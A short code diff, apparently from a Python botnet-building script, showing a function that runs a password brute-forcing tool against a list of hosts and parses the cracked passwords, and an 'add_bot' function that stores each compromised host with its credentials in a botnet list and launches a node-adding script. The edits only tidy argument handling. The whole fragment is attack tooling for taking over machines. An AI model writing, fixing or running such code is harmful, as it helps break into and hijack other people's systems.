@@ -75,7 +75,7 @@ def hydra(hosts):
         response = output.communicate()[0]
         str_res = response.decode("utf-8")
         print(str_res)
-        if str_res.split("password: ",1)  is None:
+        if str_res.split("password: ", 1)  is None:
             continue
         rest = str_res.split("password: ", 1)[1]
         password =rest.split("\n",1)[0]
@@ -88,7 +88,7 @@ def hydra(hosts):
 botnet = []
 def add_bot(host, user, password):
     new_bot = Bot(host, user, password)
-    output = subprocess.Popen(['python add_node.py'], stdout = subprocess.PIPE)
+    output = subprocess.Popen(['python', 'add_node.py'], stdout = subprocess.PIPE)
     response = output.communicate()[0]
     str_res = response.decode("utf-8")
     botnet.append(new_bot)
